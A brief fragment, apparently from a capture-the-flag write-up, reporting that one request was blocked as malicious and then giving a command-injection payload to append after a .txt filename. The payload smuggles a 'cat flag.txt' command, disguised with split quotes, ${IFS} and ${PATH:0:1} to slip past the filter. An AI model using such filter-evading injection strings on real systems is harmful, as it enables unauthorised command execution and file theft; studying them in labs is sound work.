I tested each request, and found one that would display "malicious request denied"

Add after the .txt file:
```
$(c'a't${IFS}${PATH:0:1}flag.txt)
```
